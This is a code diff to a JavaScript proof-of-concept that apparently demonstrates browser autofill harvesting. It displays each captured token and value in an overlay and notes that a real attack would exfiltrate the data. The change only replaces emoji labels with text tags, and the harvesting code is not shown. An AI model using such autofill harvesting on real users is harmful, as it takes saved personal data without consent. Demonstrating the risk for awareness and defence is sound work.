@@ -157,12 +157,12 @@ export async function demoAutofillHarvest(options = {}) {
         'position:fixed;top:10px;right:10px;z-index:2147483645;background:rgba(0,0,0,0.85);color:#0f0;' +
         'font-family:monospace;font-size:12px;padding:12px;border-radius:6px;max-width:400px;max-height:350px;' +
         'overflow-y:auto;white-space:pre-wrap;word-break:break-all;';
-    panel.innerHTML = '<strong>⏳ Waiting for browser autofill...</strong><br>';
+    panel.innerHTML = '<strong>[WAITING] Waiting for browser autofill...</strong><br>';
     document.body.appendChild(panel);
 
     const result = await harvestAutofillData({
         ...options, onProgress: (token, value) => {
-            panel.innerHTML += `✅ ${token}: <strong>${value}</strong><br>`;
+            panel.innerHTML += `[+] ${token}: <strong>${value}</strong><br>`;
             panel.scrollTop = panel.scrollHeight;
             console.log(`[autofill_harvest] ${token} = ${value}`);
         }
@@ -170,11 +170,11 @@ export async function demoAutofillHarvest(options = {}) {
 
     // Final panel content
     const filled = result.filledTokens.length;
-    panel.innerHTML += `<br>📊 Harvested ${filled} token(s) out of ${result.autofillData ? Object.keys(result.autofillData).length : 0}.<br>`;
+    panel.innerHTML += `<br>[SUMMARY] Harvested ${filled} token(s) out of ${result.autofillData ? Object.keys(result.autofillData).length : 0}.<br>`;
     if (filled === 0) {
-        panel.innerHTML += '<span style="color:#ff0;">⚠️ No saved data – your browser might not have autofill information.</span><br>';
+        panel.innerHTML += '<span style="color:#ff0;">[NOTICE] No saved data – your browser might not have autofill information.</span><br>';
     } else {
-        panel.innerHTML += '<span style="color:#ff0;">⚠️ In a real attack, this data would be exfiltrated.</span><br>';
+        panel.innerHTML += '<span style="color:#ff0;">[WARNING] In a real attack, this data would be exfiltrated.</span><br>';
     }
     setTimeout(() => panel.remove(), 15000);
     console.log('[autofill_harvest] Full result:', result);
